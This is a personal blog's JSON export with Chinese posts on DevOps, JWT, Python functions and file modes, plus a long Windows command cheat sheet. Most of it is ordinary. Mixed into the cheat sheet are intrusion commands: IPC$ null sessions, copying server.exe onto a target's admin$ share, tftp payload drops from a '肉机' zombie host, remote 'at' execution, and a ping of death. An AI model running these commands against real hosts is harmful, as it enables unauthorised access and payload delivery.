{"meta":{"title":"Mr.Jiang的博客","subtitle":"","description":"","author":"Mr.Jiang","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"自动化运维架构","slug":"自动化运维架构","date":"2018-12-18T15:28:15.000Z","updated":"2019-12-18T15:35:39.400Z","comments":true,"path":"2018/12/18/自动化运维架构/","link":"","permalink":"http://yoursite.com/2018/12/18/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E6%9E%B6%E6%9E%84/","excerpt":"1、DevOps定义 1. DevOps是“开发”和“运维”的缩写。 2. DevOps是一组最佳实践强调（IT研发、运维、测试）在应用和服务生命周期中的协作和沟通 3. 强调整个组织的合作以及交付和基础设施变更自动化，从而实现持续集成、持续部署和持续交付","text":"1、DevOps定义 1. DevOps是“开发”和“运维”的缩写。 2. DevOps是一组最佳实践强调（IT研发、运维、测试）在应用和服务生命周期中的协作和沟通 3. 强调整个组织的合作以及交付和基础设施变更自动化，从而实现持续集成、持续部署和持续交付 2、DevOps持续交付环 1. 我们把开发交付划分为: 计划 –&gt; 编码 –&gt; 构建 –&gt; 测试 –&gt; 版本 –&gt; 部署 –&gt; 运维 –&gt; 监控 的一个闭环。 2. DevOps的目标是通过建立并不断完善持续交付的流水线。 3、DevOps的四大模块 1. 项目管理：JIRA、Redmine 2. 运维平台：CMDB、监控、日志等 3. 代码托管：SVN、GitLab 3. 持续交付：JenKins 监控工具 Zabbix、openfalcon、nagios、Prometheus 自动化运维管理工具 saltstack/ansible/puppet 平台开发 CMDB、监控系统、工单系统、ELK日志分析监控、DevOps CI/CD自动化交付平台 常用工具 Jenkins/Git/Maven、Nginx/apache、Git、Lvs/keepalive、Hadoop、Docker、kafka、Kubernetes 运维基础 Shell、linux、awk","categories":[],"tags":[{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"}]},{"title":"什么是JWT","slug":"什么是JWT","date":"2018-10-20T16:44:17.000Z","updated":"2019-11-21T15:57:47.666Z","comments":true,"path":"2018/10/21/什么是JWT/","link":"","permalink":"http://yoursite.com/2018/10/21/%E4%BB%80%E4%B9%88%E6%98%AFJWT/","excerpt":"Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。","text":"Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。 在用户注册或登录后，我们想记录用户的登录状态，或者为用户创建身份认证的凭证。我们不再使用Session认证机制，而使用Json Web Token认证机制。 传统的session认证我们知道，http协议本身是一种无状态的协议，而这就意味着如果用户向我们的应用提供了用户名和密码来进行用户认证，那么下一次请求时，用户还要再一次进行用户认证才行，因为根据http协议，我们并不能知道是哪个用户发出的请求，所以为了让我们的应用能识别是哪个用户发出的请求，我们只能在服务器存储一份用户登录的信息，这份登录信息会在响应时传递给浏览器，告诉其保存为cookie,以便下次请求时发送给我们的应用，这样我们的应用就能识别请求来自哪个用户了,这就是传统的基于session认证。 但是这种基于session的认证使应用本身很难得到扩展，随着不同客户端用户的增加，独立的服务器已无法承载更多的用户，而这时候基于session认证应用的问题就会暴露出来. 基于session认证所显露的问题Session: 每个用户经过我们的应用认证之后，我们的应用都要在服务端做一次记录，以方便用户下次请求的鉴别，通常而言session都是保存在内存中，而随着认证用户的增多，服务端的开销会明显增大。 扩展性: 用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，相应的限制了负载均衡器的能力。这也意味着限制了应用的扩展能力。 CSRF: 因为是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造的攻击。 基于token的鉴权机制基于token的鉴权机制类似于http协议也是无状态的，它不需要在服务端去保留用户的认证信息或者会话信息。这就意味着基于token认证机制的应用不需要去考虑用户在哪一台服务器登录了，这就为应用的扩展提供了便利。 流程上是这样的： • 用户使用用户名密码来请求服务器 • 服务器进行验证用户的信息 • 服务器通过验证发送给用户一个token • 客户端存储token，并在每次请求时附送上这个token值 • 服务端验证token值，并返回数据 这个token必须要在每次请求时传递给服务端，它应该保存在请求头里， 另外，服务端要支持CORS(跨来源资源共享)策略，一般我们在服务端这么做就可以了Access-Control-Allow-Origin: *。 那么我们现在回到JWT的主题上。 JWT长什么样？JWT是由三段信息构成的，将这三段信息文本用.链接一起就构成了Jwt字符串。就像这样: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ JWT的构成第一部分我们称它为头部（header),第二部分我们称其为载荷（payload, 类似于飞机上承载的物品)，第三部分是签证（signature). header jwt的头部承载两部分信息： • 声明类型，这里是jwt • 声明加密的算法 通常直接使用 HMAC SHA256 完整的头部就像下面这样的JSON： { ‘typ’: ‘JWT’, ‘alg’: ‘HS256’ } 然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分. eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 playload 载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分 • 标准中注册的声明 • 公共的声明 • 私有的声明 标准中注册的声明(建议但不强制使用) ： • iss: jwt签发者 • sub: jwt所面向的用户 • aud: 接收jwt的一方 • exp: jwt的过期时间，这个过期时间必须要大于签发时间 • nbf: 定义在什么时间之前，该jwt都是不可用的. • iat: jwt的签发时间 • jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。 公共的声明： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密. 私有的声明： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。 定义一个payload: { “sub”: “1234567890”, “name”: “John Doe”, “admin”: true } 然后将其进行base64加密，得到Jwt的第二部分。 eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9 signature jwt的第三部分是一个签证信息，这个签证信息由三部分组成： • header (base64后的) • payload (base64后的) • secret 这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分。 // javascript var encodedString = base64UrlEncode(header) + ‘.’ + base64UrlEncode(payload); var signature = HMACSHA256(encodedString, ‘secret’); // TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 将这三部分用.连接成一个完整的字符串,构成了最终的jwt: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9. eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9. TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ 注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。 如何应用 一般是在请求头里加入Authorization，并加上Bearer标注： fetch(‘api/user/1’, { headers: { ‘Authorization’: ‘Bearer ‘ + token } }) 优点 • 因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用。 • 因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息。 • 便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的。 • 它不需要在服务端保存会话信息, 所以它易于应用的扩展 安全相关 • 不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分。 • 保护好secret私钥，该私钥非常重要。 • 如果可以，请使用https协议","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://yoursite.com/tags/web/"}]},{"title":"python高阶函数","slug":"python高阶函数","date":"2018-10-15T15:57:12.000Z","updated":"2019-11-21T16:07:45.106Z","comments":true,"path":"2018/10/15/python高阶函数/","link":"","permalink":"http://yoursite.com/2018/10/15/python%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/","excerpt":"高阶函数：一个函数可以作为参数传给另外一个函数，或者一个函数的返回值为另外一个函数（若返回值为该函数本身，则为递归），满足其一则为高阶函数。","text":"高阶函数：一个函数可以作为参数传给另外一个函数，或者一个函数的返回值为另外一个函数（若返回值为该函数本身，则为递归），满足其一则为高阶函数。 map() map()是 Python 内置的高阶函数，它接收一个函数function 和一个 list，并通过把函数 function 依次作用在 list 的每个元素上，得到一个新的 list 并返回。 这个例子中，假设用户输入的英文名字不规范，没有按照首字母大写，后续字母小写的规则，可以利用map()函数把一个list（包含若干不规范的英文名字）变成一个包含规范英文名字的list。 12345678def format_name(s): return s.capitalize()result = map(format_name, ['adam', 'LISA', 'barT'])print(list(result))# 输出内容：# ['Adam', 'Lisa', 'Bart'] 要注意的一点是，由于结果result是一个Iterator，Iterator是惰性可迭代序列，因此通过list()函数让它把整个序列都计算出来并返回一个list。 filter() filter()接收一个函数function 和一个list，这个function 的作用是对list的每个元素进行判断，返回True或False，filter()根据判断结果自动过滤掉不符合条件的元素，返回由符合条件元素组成的新list。 1234567891011def is_contain_s(s): if 'E' in s: return True else: return False result = filter(is_contain_s, ['sTEst', 'abc', 'str', ' ', 'END'])print(list(result))# 输出内容：# ['sTEst', 'END'] reduce() reduce()函数也接收一个函数function, 和一个list。但reduce()传入的函数必须接收两个参数，reduce()对list的每个元素反复调用函数function, 并返回最终结果值。 1在Python 3里，reduce()函数已经被从全局名字空间里移除了，它现在被放置在fucntools模块里， 要使用的话要 先引入from functools import reduce 12345678910from functools import reducedef f(x, y): return x + yresult = reduce(f, [1, 3, 5, 7, 9])print(result)# 输出内容：# 25","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"python的文件读写","slug":"python的文件读写","date":"2018-10-07T10:30:17.000Z","updated":"2019-11-21T15:57:40.492Z","comments":true,"path":"2018/10/07/python的文件读写/","link":"","permalink":"http://yoursite.com/2018/10/07/python%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/","excerpt":"在python对文件进行读写操作的时候，常常涉及到“读写模式”，整理了一下常见的几种模式，如下：","text":"在python对文件进行读写操作的时候，常常涉及到“读写模式”，整理了一下常见的几种模式，如下： 读写模式：r ：只读r+ : 读写w ： 新建（会对原有文件进行覆盖）a ： 追加b ： 二进制文件 常用的模式有：“a” 以“追加”模式打开， (从 EOF 开始, 必要时创建新文件)“a+” 以”读写”模式打开“ab” 以”二进制 追加”模式打开“ab+” 以”二进制 读写”模式打开 “w” 以”写”的方式打开“w+” 以“读写”模式打开“wb” 以“二进制 写”模式打开“wb+” 以“二进制 读写”模式打开 “r+” 以”读写”模式打开“rb” 以”二进制 读”模式打开“rb+” 以”二进制 读写”模式打开 rU 或 Ua 以”读”方式打开, 同时提供通用换行符支持 (PEP 278) 需注意：1、使用“w”模式。文件若存在，首先要清空，然后重新创建2、使用“a”模式。把所有要写入文件的数据都追加到文件的末尾，即使你使用了seek（）指向文件的其他地方，如果文件不存在，将自动被创建。 3、f.read([size]) ：size未指定则返回整个文件，如果文件大小&gt;2倍内存则有问题。f.read()读到文件尾时返回”“(空字串)4、file.readline() 返回一行5、file.readline([size]) 返回包含size行的列表,size 未指定则返回全部行6、”for line in f: print line” 通过迭代器访问7、f.write(“hello\\n”) #如果要写入字符串以外的数据,先将他转换为字符串.8、f.tell() 返回一个整数,表示当前文件指针的位置(就是到文件头的比特数).9、f.seek(偏移量,[起始位置]) ： 用来移动文件指针偏移量 : 单位“比特”,可正可负起始位置 : 0 -文件头, 默认值; 1 -当前位置; 2 -文件尾10、f.close() 关闭文件####以上。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Windows终端命令集合","slug":"Windows基本操作","date":"2018-05-13T10:29:18.000Z","updated":"2019-11-20T16:39:46.917Z","comments":true,"path":"2018/05/13/Windows基本操作/","link":"","permalink":"http://yoursite.com/2018/05/13/Windows%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/","excerpt":"虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows的各种版本都与其兼容，用户可以在Windows 系统下运行DOS，中文版Windows XP 中的命令提示符进一步提高了与DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。","text":"虽然随着计算机产业的发展，Windows 操作系统的应用越来越广泛，DOS 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows的各种版本都与其兼容，用户可以在Windows 系统下运行DOS，中文版Windows XP 中的命令提示符进一步提高了与DOS 下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。 CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本) CMD命令锦集 1. gpedit.msc-----组策略 2. sndrec32——-录音机 3. Nslookup——-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。 4. explorer——-打开资源管理器 5. logoff———注销命令 6. shutdown——-60秒倒计时关机命令 7. lusrmgr.msc—-本机用户和组 8. services.msc—本地服务设置 9. oobe/msoobe /a—-检查XP是否激活 10. notepad——–打开记事本 11. cleanmgr——-垃圾整理 12. net start messenger—-开始信使服务 13. compmgmt.msc—计算机管理 14. net stop messenger—–停止信使服务 15. conf———–启动netmeeting 16. dvdplay——–DVD播放器 17. charmap——–启动字符映射表 18. diskmgmt.msc—磁盘管理实用程序 19. calc———–启动计算器 20. dfrg.msc——-磁盘碎片整理程序 21. chkdsk.exe—–Chkdsk磁盘检查 22. devmgmt.msc— 设备管理器 23. regsvr32 /u *.dll—-停止dll文件运行 24. drwtsn32—— 系统医生 25. rononce -p—-15秒关机 26. dxdiag———检查DirectX信息 27. regedt32——-注册表编辑器 28. Msconfig.exe—系统配置实用程序 29. rsop.msc——-组策略结果集 30. mem.exe——–显示内存使用情况 31. regedit.exe—-注册表 32. winchat——–XP自带局域网聊天 33. progman——–程序管理器 34. winmsd———系统信息 35. perfmon.msc—-计算机性能监测程序 36. winver———检查Windows版本 37. sfc /scannow—–扫描错误并复原 38. taskmgr—–任务管理器（2000/xp/2003 40. wmimgmt.msc—-打开windows管理体系结构(WMI) 41. wupdmgr——–windows更新程序 42. wscript——–windows脚本宿主设置 43. write———-写字板 45. wiaacmgr——-扫描仪和照相机向导 46. winchat——–XP自带局域网聊天 49. mplayer2——-简易widnows media player 50. mspaint——–画图板 51. mstsc———-远程桌面连接 53. magnify——–放大镜实用程序 54. mmc————打开控制台 55. mobsync——–同步命令 57. iexpress——-木马捆绑工具，系统自带 58. fsmgmt.msc—–共享文件夹管理器 59. utilman——–辅助工具管理器 61. dcomcnfg——-打开系统组件服务 62. ddeshare——-打开DDE共享设置 110. osk————打开屏幕键盘 111. odbcad32——-ODBC数据源管理器 112. oobe/msoobe /a—-检查XP是否激活 68. ntbackup——-系统备份和还原 69. narrator——-屏幕“讲述人” 70. ntmsmgr.msc—-移动存储管理器 71. ntmsoprq.msc—移动存储管理员操作请求 72. netstat -an—-(TC)命令检查接口 73. syncapp——–创建一个公文包 74. sysedit——–系统配置编辑器 75. sigverif——-文件签名验证程序 76. ciadv.msc——索引服务程序 77. shrpubw——–创建共享文件夹 78. secpol.msc—–本地安全策略 79. syskey———系统加密，一旦加密就不能解开，保护windows xp系统的双重密码 80. services.msc—本地服务设置 81. Sndvol32——-音量控制程序 82. sfc.exe——–系统文件检查器 83. sfc /scannow—windows文件保护 84. ciadv.msc——索引服务程序 85. tourstart——xp简介（安装完成后出现的漫游xp程序） 86. taskmgr——–任务管理器 87. eventvwr——-事件查看器 88. eudcedit——-造字程序 89. compmgmt.msc—计算机管理 90. packager——-对象包装程序 91. perfmon.msc—-计算机性能监测程序 92. charmap——–启动字符映射表 93. cliconfg——-SQL SERVER 客户端网络实用程序 94. Clipbrd——–剪贴板查看器 95. conf———–启动netmeeting 96. certmgr.msc—-证书管理实用程序 97. regsvr32 /u *.dll—-停止dll文件运行 98. regsvr32 /u zipfldr.dll——取消ZIP支持 99. cmd.exe——–CMD命令提示符 操作详解 net use ipipc$ &quot; &quot; /user:&quot; &quot; 建立IPC空链接 net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接 net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H: net use h: ipc$ 登陆后映射对方C：到本地为H: net use ipipc$ /del 删除IPC链接 net use h: /del 删除映射对方到本地的为H:的映射 net user 用户名 密码 /add 建立用户 net user guest /active:yes 激活guest用户 net user 查看有哪些用户 net user 帐户名 查看帐户的属性 net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限 net start 查看开启了哪些服务 net start 服务名 开启服务；(如:net start telnet， net start schedule) net stop 服务名 停止某服务 net time 目标ip 查看对方时间 net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息 net view 查看本地局域网内开启了哪些共享 net view ip 查看对方局域网内开启了哪些共享 net config 显示系统网络设置 net logoff 断开连接的共享 net pause 服务名 暂停某服务 net send ip “文本信息” 向对方发信息 net ver 局域网内正在使用的网络连接类型和信息 net share 查看本地开启的共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 net share c$ /del 删除C：共享 net user guest 12345 用guest用户登陆后用将密码改为12345 net password 密码 更改系统登陆密码 netstat -a 查看开启了哪些端口,常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况 netstat -s 查看正在使用的所有协议使用情况 nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名 tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。 ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。 ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息 tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR .”表示删除当前目录下所有只读文件，“DEL/A-S .”表示删除当前目录下除系统文件以外的所有文件 del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） move 盘符路径要移动的文件名 存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 finger username @host 查看最近有哪些用户登陆 telnet ip 端口 远和登陆服务器,默认端口为23 open ip 连接到IP（属telnet登陆后的命令） telnet 在本机上直接键入telnet 将进入本机的telnet copy 路径文件名1 路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件 copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下 copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件 copy ipadmin$svv.exe c: 或:copyipadmin$. 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： xcopy 要复制的文件或目录树 目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 用参数/e才可连目录下的子目录一起复制到目标地址下。 tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送 tftp -i 对方IP put c:server.exe 登陆后，上传本地c:server.exe至主机 ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时) route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 mem 查看cpu使用情况 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性 dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间 set 指定环境变量名称=要指派给变量的字符 设置环境变量 set 显示当前所有的环境变量 set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 pause 暂停批处理程序，并显示出：请按任意键继续…. if 在批处理程序中执行条件处理（更多说明见if命令及变量） goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签） call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 echo 信息 在屏幕上显示出信息 echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中 findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello find 文件名 查找某文件 title 标题名字 更改CMD窗口标题名字 color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky ) ver 在DOS窗口下显示版本信息 winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名） format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS md 目录名 创建目录 replace 源文件 要替换文件的目录 替换文件 ren 原文件名 新文件名 重命名文件名 tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称 type 文件名 显示文本文件的内容 more 文件名 逐屏显示输出文件 doskey 要锁定的命令=字符 doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir= taskmgr 调出任务管理器 chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误 tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口 exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe path 路径可执行文件的文件名 为可执行文件设置一个路径。 cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /? regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示； regedit /e 注册表文件名 导出注册表 cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。 cacls 文件名 查看文件的访问用户权限列表 REM 文本内容 在批处理文件中添加注解 netsh 查看或更改本地网络配置情况 IIS服务命令 iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现） iisreset /start或stop 启动（停止）所有Internet服务 iisreset /restart 停止然后重新启动所有Internet服务 iisreset /status 显示所有Internet服务状态 iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动 iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机 iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务 iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。 FTP 命令： (后面有详细说明内容) ftp的命令行格式为: ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。 －d 使用调试方式。 －n 限制ftp的自动登录,即不使用.netrc文件。 －g 取消全局文件名。 help [命令] 或 ？[命令] 查看命令说明 bye 或 quit 终止主机FTP进程,并退出FTP管理方式. pwd 列出当前远端主机目录 put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中 get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中 mget [remote-files] 从远端主机接收一批文件至本地主机 mput local-files 将本地主机中一批文件传送至远端主机 dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件 ascii 设定以ASCII方式传送文件(缺省值) bin 或 image 设定以二进制方式传送文件 bell 每完成一次文件传送,报警提示 cdup 返回上一级目录 close 中断与远程服务器的ftp会话(与open对应) open host[port] 建立指定ftp服务器连接,可指定连接端口 delete 删除远端主机中的文件 mdelete [remote-files] 删除一批文件 mkdir directory-name 在远端主机中建立目录 rename [from] [to] 改变远端主机中的文件名 rmdir directory-name 删除远端主机中的目录 status 显示当前FTP的状态 system 显示远端主机系统类型 user user-name [password] [account] 重新以别的用户名登录远端主机 open host [port] 重新建立一个新的连接 prompt 交互提示模式 macdef 定义宏命令 lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录 chmod 改变远端主机的文件权限 case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母 cd remote－dir 进入远程主机目录 cdup 进入远程主机目录的父目录 ! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip #5 MYSQL 命令 mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。 （例：mysql -h110.110.110.110 -Uroot -P123456 注:u与root可以不用加空格，其它也一样） exit 退出MYSQL mysqladmin -u用户名 -p旧密码 password 新密码 修改密码 grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符） show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。 use mysql； show tables; 显示库中的数据表 describe 表名; 显示数据表的结构 create database 库名; 建库 use 库名； create table 表名 (字段设定列表)； 建表 drop database 库名; drop table 表名； 删库和删表 delete from 表名; 将表中记录清空 select * from 表名; 显示表中的记录 mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。 win2003系统下新增命令（实用部份）： shutdown /参数 关闭或重启本地或远程主机。 参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。 例：shutdown /r /t 0 立即重启本地主机（无延时） taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。 参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。 tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。 参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 Linux系统下基本命令 注：要区分大小写 uname 显示版本信息（同win2K的 ver） dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir） pwd 查询当前所在的目录位置 cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。 cat 文件名 查看文件内容 cat &gt;abc.txt 往abc.txt文件中写上内容。 more 文件名 以一页一页的方式显示一个文本文件。 cp 复制文件 mv 移动文件 rm 文件名 删除文件，rm -a 目录名删除目录及子目录 mkdir 目录名 建立目录 rmdir 删除子目录，目录内没有文档。 chmod 